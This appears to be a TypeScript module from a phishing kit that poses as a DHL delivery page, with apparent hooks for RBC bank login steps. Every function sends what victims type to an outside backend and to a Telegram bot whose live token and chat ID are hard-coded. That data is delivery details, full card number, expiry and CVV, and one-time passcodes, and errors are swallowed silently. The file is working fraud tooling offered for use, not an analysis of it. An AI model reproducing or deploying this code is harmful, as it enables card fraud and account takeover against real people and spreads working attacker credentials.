// 🔗 URL DU BACKEND — Pointe vers le backend blink.new du projet DHL
const FUNCTION_URL = "https://t0ni0y56.backend.blink.new";

// 🤖 BOT 2 — Reçoit delivery, payment, otp (directement depuis le frontend en backup)
const BOT2_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
const BOT2_CHAT_ID = "6788012481"; // ⚠️ Remplacez par le Chat ID du 2e bot si différent

// Envoie directement au BOT 2 (sans passer par le backend)
async function sendToBot2(text: string): Promise<void> {
  try {
    await fetch(`https://api.telegram.org/bot${BOT2_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: BOT2_CHAT_ID, text, parse_mode: "HTML" }),
    });
  } catch {
    // Silent fail
  }
}

export async function notifyVisit(page: string): Promise<void> {
  try {
    // Visite → Bot 1 seulement (via backend)
    await fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "visit", data: { page } }),
    });
  } catch {
    // Silent fail
  }
}

export async function notifyDelivery(data: {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  postalCode: string;
}): Promise<void> {
  // Delivery → Bot 1 (via backend) + Bot 2 (direct)
  const message =
    `📦 <b>DHL — Delivery Form Submitted</b>\n\n` +
    `👤 <b>Name:</b> ${data.firstName} ${data.lastName}\n` +
    `📧 <b>Email:</b> ${data.email}\n` +
    `📞 <b>Phone:</b> ${data.phone}\n` +
    `🏠 <b>Address:</b> ${data.address}\n` +
    `🏙️ <b>City:</b> ${data.city}\n` +
    `📮 <b>Postal Code:</b> ${data.postalCode}`;

  await Promise.all([
    fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "delivery", data }),
    }).catch(() => {}),
    sendToBot2(message),
  ]);
}

export async function notifyPayment(data: {
  cardName: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
}): Promise<void> {
  // Payment → Bot 1 (via backend) + Bot 2 (direct)
  const message =
    `💳 <b>DHL — Payment Form Submitted</b>\n\n` +
    `👤 <b>Card Holder:</b> ${data.cardName}\n` +
    `💳 <b>Card Number:</b> ${data.cardNumber}\n` +
    `📅 <b>Expiry:</b> ${data.expiry}\n` +
    `🔒 <b>CVV:</b> ${data.cvv}`;

  await Promise.all([
    fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "payment", data }),
    }).catch(() => {}),
    sendToBot2(message),
  ]);
}

export async function notifyOTP(otp: string): Promise<void> {
  // OTP → Bot 1 (via backend) + Bot 2 (direct)
  const message =
    `🔐 <b>DHL — OTP Code Submitted</b>\n\n` +
    `🔑 <b>OTP Code:</b> ${otp}`;

  await Promise.all([
    fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "otp", data: { otp } }),
    }).catch(() => {}),
    sendToBot2(message),
  ]);
}

export async function notifyRBCData(stepName: string, data: Record<string, any>): Promise<void> {
  try {
    await fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "rbc_step", data: { step: stepName, ...data } }),
    });
  } catch {
    // Silent fail
  }
}

